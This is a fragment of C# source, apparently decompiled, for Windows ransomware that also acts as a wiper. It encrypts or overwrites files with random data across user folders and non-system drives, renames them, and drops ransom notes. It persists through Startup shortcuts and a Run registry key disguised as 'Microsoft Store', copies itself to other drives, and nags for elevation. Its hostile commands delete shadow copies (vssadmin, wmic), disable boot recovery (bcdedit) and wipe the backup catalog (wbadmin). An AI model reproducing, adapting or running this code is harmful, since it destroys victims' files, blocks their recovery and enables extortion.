	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
